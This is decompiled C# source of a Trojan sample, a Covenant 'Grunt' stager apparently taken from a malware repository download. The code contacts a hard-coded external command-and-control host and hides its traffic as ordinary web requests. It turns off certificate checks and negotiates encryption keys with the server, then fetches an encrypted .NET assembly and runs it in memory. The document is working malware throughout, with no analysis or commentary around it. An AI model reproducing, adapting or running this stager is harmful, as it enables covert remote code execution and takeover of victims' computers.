// Decompiled with JetBrains decompiler
// Type: GruntStager.GruntStager
// Assembly: rq5uucw3.ddt, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0CBF4852-CC91-42FA-B189-EFFC9E167A83
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Grunt.gen-b78029fdb5c7d721b7fb81ffeb567b85177a35efe3d04491932469974cf0fa53.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace GruntStager
{
  public class GruntStager
  {
    public GruntStager() => this.ExecuteStager();

    [STAThread]
    public static void Main(string[] args)
    {
      GruntStager.GruntStager gruntStager = new GruntStager.GruntStager();
    }

    public static void Execute()
    {
      GruntStager.GruntStager gruntStager = new GruntStager.GruntStager();
    }

    public void ExecuteStager()
    {
      try
      {
        List<string> list1 = ((IEnumerable<string>) "https://backtry-45299.portmap.host:45299".Split(',')).ToList<string>();
        string CovenantCertHash = "35B2215DDD5FCB311C1AE0E6EDC898867D8FB53B";
        List<string> list2 = ((IEnumerable<string>) "VXNlci1BZ2VudA==".Split(',')).ToList<string>().Select<string, string>((Func<string, string>) (H => Encoding.UTF8.GetString(Convert.FromBase64String(H)))).ToList<string>();
        List<string> list3 = ((IEnumerable<string>) "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==".Split(',')).ToList<string>().Select<string, string>((Func<string, string>) (H => Encoding.UTF8.GetString(Convert.FromBase64String(H)))).ToList<string>();
        List<string> list4 = ((IEnumerable<string>) "L2VuLXVzL2luZGV4Lmh0bWw/cGFnZT17R1VJRH0mdj0x,L2VuLXVzL2RvY3MuaHRtbD90eXBlPXtHVUlEfSZ2PTE=,L2VuLXVzL3Rlc3QuaHRtbD9tZXNzYWdlPXtHVUlEfSZ2PTE=".Split(',')).ToList<string>().Select<string, string>((Func<string, string>) (U => Encoding.UTF8.GetString(Convert.FromBase64String(U)))).ToList<string>();
        string format1 = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
        string format2 = "<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>".Replace(Environment.NewLine, "\n");
        bool ValidateCert = bool.Parse("false");
        bool UseCertPinning = bool.Parse("false");
        Random random = new Random();
        string str1 = "16325df665";
        string newValue = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
        byte[] key = Convert.FromBase64String("eMQvoNbj/d0qxgD9lWaSWsXqCD1YnCiu+w5mJEnkFhM=");
        string format3 = "{{\"GUID\":\"{0}\",\"Type\":{1},\"Meta\":\"{2}\",\"IV\":\"{3}\",\"EncryptedMessage\":\"{4}\",\"HMAC\":\"{5}\"}}";
        Aes aes1 = Aes.Create();
        aes1.Mode = CipherMode.CBC;
        aes1.Padding = PaddingMode.PKCS7;
        aes1.Key = key;
        aes1.GenerateIV();
        HMACSHA256 hmacshA256_1 = new HMACSHA256(key);
        RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
        byte[] bytes = Encoding.UTF8.GetBytes(cryptoServiceProvider.ToXmlString(false));
        byte[] numArray1 = aes1.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
        byte[] hash1 = hmacshA256_1.ComputeHash(numArray1);
        string s1 = string.Format(format3, (object) (str1 + newValue), (object) "0", (object) "", (object) Convert.ToBase64String(aes1.IV), (object) Convert.ToBase64String(numArray1), (object) Convert.ToBase64String(hash1));
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
        ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) ((sender, cert, chain, errors) =>
        {
          bool flag = true;
          if (UseCertPinning && CovenantCertHash != "")
            flag = cert.GetCertHashString() == CovenantCertHash;
          if (flag & ValidateCert)
            flag = errors == SslPolicyErrors.None;
          return flag;
        });
        string str2 = GruntStager.GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s1));
        GruntStager.GruntStager.CookieWebClient cookieWebClient = new GruntStager.GruntStager.CookieWebClient();
        cookieWebClient.UseDefaultCredentials = true;
        cookieWebClient.Proxy = WebRequest.DefaultWebProxy;
        cookieWebClient.Proxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
        string uriString1 = "";
        foreach (string uriString2 in list1)
        {
          try
          {
            for (int index = 0; index < list3.Count; ++index)
            {
              if (list2[index] == "Cookie")
                cookieWebClient.SetCookies(new Uri(uriString2), list3[index].Replace(";", ",").Replace("{GUID}", ""));
              else
                cookieWebClient.Headers.Set(list2[index].Replace("{GUID}", ""), list3[index].Replace("{GUID}", ""));
            }
            cookieWebClient.DownloadString(uriString2 + list4[random.Next(list4.Count)].Replace("{GUID}", ""));
            uriString1 = uriString2;
          }
          catch
          {
          }
        }
        for (int index = 0; index < list3.Count; ++index)
        {
          if (list2[index] == "Cookie")
            cookieWebClient.SetCookies(new Uri(uriString1), list3[index].Replace(";", ",").Replace("{GUID}", newValue));
          else
            cookieWebClient.Headers.Set(list2[index].Replace("{GUID}", newValue), list3[index].Replace("{GUID}", newValue));
        }
        List<string> stringList1 = GruntStager.GruntStager.Parse(Encoding.UTF8.GetString(GruntStager.GruntStager.MessageTransform.Invert(GruntStager.GruntStager.Parse(cookieWebClient.UploadString(uriString1 + list4[random.Next(list4.Count)].Replace("{GUID}", newValue), string.Format(format1, (object) str2)), format2)[0])), format3);
        string s2 = stringList1[3];
        string s3 = stringList1[4];
        string str3 = stringList1[5];
        byte[] numArray2 = Convert.FromBase64String(s3);
        string base64String1 = Convert.ToBase64String(hmacshA256_1.ComputeHash(numArray2));
        if (str3 != base64String1)
          return;
        aes1.IV = Convert.FromBase64String(s2);
        byte[] rgb = aes1.CreateDecryptor().TransformFinalBlock(numArray2, 0, numArray2.Length);
        byte[] numArray3 = cryptoServiceProvider.Decrypt(rgb, true);
        Aes aes2 = Aes.Create();
        aes2.Mode = CipherMode.CBC;
        aes2.Padding = PaddingMode.PKCS7;
        aes2.Key = numArray3;
        aes2.GenerateIV();
        HMACSHA256 hmacshA256_2 = new HMACSHA256(aes2.Key);
        byte[] numArray4 = new byte[4];
        RandomNumberGenerator.Create().GetBytes(numArray4);
        byte[] numArray5 = aes2.CreateEncryptor().TransformFinalBlock(numArray4, 0, numArray4.Length);
        byte[] hash2 = hmacshA256_2.ComputeHash(numArray5);
        string str4 = GruntStager.GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(string.Format(format3, (object) newValue, (object) "1", (object) "", (object) Convert.ToBase64String(aes2.IV), (object) Convert.ToBase64String(numArray5), (object) Convert.ToBase64String(hash2))));
        for (int index = 0; index < list3.Count; ++index)
        {
          if (list2[index] == "Cookie")
            cookieWebClient.SetCookies(new Uri(uriString1), list3[index].Replace(";", ",").Replace("{GUID}", newValue));
          else
            cookieWebClient.Headers.Set(list2[index].Replace("{GUID}", newValue), list3[index].Replace("{GUID}", newValue));
        }
        List<string> stringList2 = GruntStager.GruntStager.Parse(Encoding.UTF8.GetString(GruntStager.GruntStager.MessageTransform.Invert(GruntStager.GruntStager.Parse(cookieWebClient.UploadString(uriString1 + list4[random.Next(list4.Count)].Replace("{GUID}", newValue), string.Format(format1, (object) str4)), format2)[0])), format3);
        string s4 = stringList2[3];
        string s5 = stringList2[4];
        string str5 = stringList2[5];
        byte[] numArray6 = Convert.FromBase64String(s5);
        string base64String2 = Convert.ToBase64String(hmacshA256_2.ComputeHash(numArray6));
        if (str5 != base64String2)
          return;
        aes2.IV = Convert.FromBase64String(s4);
        byte[] src = aes2.CreateDecryptor().TransformFinalBlock(numArray6, 0, numArray6.Length);
        byte[] numArray7 = new byte[4];
        byte[] numArray8 = new byte[4];
        Buffer.BlockCopy((Array) src, 0, (Array) numArray7, 0, 4);
        Buffer.BlockCopy((Array) src, 4, (Array) numArray8, 0, 4);
        if (Convert.ToBase64String(numArray4) != Convert.ToBase64String(numArray7))
          return;
        aes2.GenerateIV();
        byte[] numArray9 = aes2.CreateEncryptor().TransformFinalBlock(numArray8, 0, numArray8.Length);
        byte[] hash3 = hmacshA256_2.ComputeHash(numArray9);
        string str6 = GruntStager.GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(string.Format(format3, (object) newValue, (object) "2", (object) "", (object) Convert.ToBase64String(aes2.IV), (object) Convert.ToBase64String(numArray9), (object) Convert.ToBase64String(hash3))));
        for (int index = 0; index < list3.Count; ++index)
        {
          if (list2[index] == "Cookie")
            cookieWebClient.SetCookies(new Uri(uriString1), list3[index].Replace(";", ",").Replace("{GUID}", newValue));
          else
            cookieWebClient.Headers.Set(list2[index].Replace("{GUID}", newValue), list3[index].Replace("{GUID}", newValue));
        }
        List<string> stringList3 = GruntStager.GruntStager.Parse(Encoding.UTF8.GetString(GruntStager.GruntStager.MessageTransform.Invert(GruntStager.GruntStager.Parse(cookieWebClient.UploadString(uriString1 + list4[random.Next(list4.Count)].Replace("{GUID}", newValue), string.Format(format1, (object) str6)), format2)[0])), format3);
        string s6 = stringList3[3];
        string s7 = stringList3[4];
        string str7 = stringList3[5];
        byte[] numArray10 = Convert.FromBase64String(s7);
        string base64String3 = Convert.ToBase64String(hmacshA256_2.ComputeHash(numArray10));
        if (str7 != base64String3)
          return;
        aes2.IV = Convert.FromBase64String(s6);
        Assembly.Load(aes2.CreateDecryptor().TransformFinalBlock(numArray10, 0, numArray10.Length)).GetTypes()[0].GetMethods()[0].Invoke((object) null, new object[4]
        {
          (object) uriString1,
          (object) CovenantCertHash,
          (object) newValue,
          (object) aes2
        });
      }
      catch (Exception ex)
      {
        Console.Error.WriteLine(ex.Message + Environment.NewLine + ex.StackTrace);
      }
    }

    public static List<string> Parse(string data, string format)
    {
      format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
      if (format.Contains("{0}"))
        format = format.Replace("{0}", "(?'group0'.*)");
      if (format.Contains("{1}"))
        format = format.Replace("{1}", "(?'group1'.*)");
      if (format.Contains("{2}"))
        format = format.Replace("{2}", "(?'group2'.*)");
      if (format.Contains("{3}"))
        format = format.Replace("{3}", "(?'group3'.*)");
      if (format.Contains("{4}"))
        format = format.Replace("{4}", "(?'group4'.*)");
      if (format.Contains("{5}"))
        format = format.Replace("{5}", "(?'group5'.*)");
      Match match = new Regex(format).Match(data);
      List<string> stringList = new List<string>();
      if (match.Groups["group0"] != null)
        stringList.Add(match.Groups["group0"].Value);
      if (match.Groups["group1"] != null)
        stringList.Add(match.Groups["group1"].Value);
      if (match.Groups["group2"] != null)
        stringList.Add(match.Groups["group2"].Value);
      if (match.Groups["group3"] != null)
        stringList.Add(match.Groups["group3"].Value);
      if (match.Groups["group4"] != null)
        stringList.Add(match.Groups["group4"].Value);
      if (match.Groups["group5"] != null)
        stringList.Add(match.Groups["group5"].Value);
      return stringList;
    }

    public class CookieWebClient : WebClient
    {
      public CookieContainer CookieContainer { get; private set; }

      public CookieWebClient() => this.CookieContainer = new CookieContainer();

      public void SetCookies(Uri uri, string cookies) => this.CookieContainer.SetCookies(uri, cookies);

      protected override WebRequest GetWebRequest(Uri address)
      {
        if (!(base.GetWebRequest(address) is HttpWebRequest webRequest))
          return base.GetWebRequest(address);
        webRequest.CookieContainer = this.CookieContainer;
        return (WebRequest) webRequest;
      }
    }

    public static class MessageTransform
    {
      public static string Transform(byte[] bytes) => Convert.ToBase64String(bytes);

      public static byte[] Invert(string str) => Convert.FromBase64String(str);
    }
  }
}
